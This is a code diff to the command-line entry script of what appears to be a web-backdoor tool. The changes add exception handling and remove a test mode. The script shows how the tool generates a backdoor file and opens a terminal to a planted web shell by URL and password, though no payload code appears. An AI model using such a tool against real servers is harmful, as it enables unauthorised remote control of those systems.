@@ -21,8 +21,8 @@
 from core.terminal import Terminal, module_trigger, help_string
 from core.backdoor import Backdoor
 from core.modules_handler import ModHandler
+from core.module import ModuleException
 from core.helper import Helper
-from core.test import Test
 
 import sys
     
@@ -56,6 +56,8 @@ if __name__ == "__main__":
           
         try:
             Terminal ( ModHandler( url, password ) ).loop()
+        except ModuleException, e:
+            print e
         except KeyboardInterrupt:
             print '\n[!] Exiting. Bye ^^'
         
@@ -64,13 +66,6 @@ if __name__ == "__main__":
          Backdoor( sys.argv[2] ).save( sys.argv[3] )
         except Exception, e:
             print '\n[!] Creation error: %s ' % str(e)
-            raise
-            
-    elif len(sys.argv) == 4 and sys.argv[1] == 'test':
-        try:
-         Test( ModHandler(sys.argv[2], sys.argv[3]) ).runtest()
-        except Exception, e:
-            print '\n[!] Test error: %s ' % str(e)
             raise
         
     elif len(sys.argv) > 3 and sys.argv[1].startswith('http'):
@@ -83,7 +78,7 @@ if __name__ == "__main__":
             modname = ''
             if len(sys.argv)>4:
                 modname = sys.argv[4]
-            print Helper().helps(modname)
+            print ModHandler(url, password).helps(modname)
             
         else:
         
@@ -95,7 +90,8 @@ if __name__ == "__main__":
                 else:
                     terminal.run_line_cmd(' '.join(sys.argv[3:]))
                 
-                
+            except ModuleException, e:
+                print e
             except KeyboardInterrupt:
                 print '\n[!] Exiting. Bye ^^'
     else:
